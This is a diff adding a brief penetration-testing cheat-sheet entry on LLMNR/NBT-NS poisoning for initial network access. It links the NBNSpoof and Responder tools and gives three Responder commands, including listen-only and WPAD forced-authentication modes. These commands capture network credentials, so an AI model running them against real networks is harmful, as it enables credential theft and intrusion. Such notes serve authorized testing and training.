@@ -1,1 +1,11 @@
-
+#Initial Access
+##Poisoning and Spoofing LLMNR NBT-NS
+###Tools
+NBNSpoof
+https://github.com/nomex/nbnspoof
+Responder
+https://github.com/lgandx/Responder
+**Examples**
+```responder -I eth0```
+```responder -I eth0 -A``` Listen Only
+```responder -I eth0 -wF``` WPAD
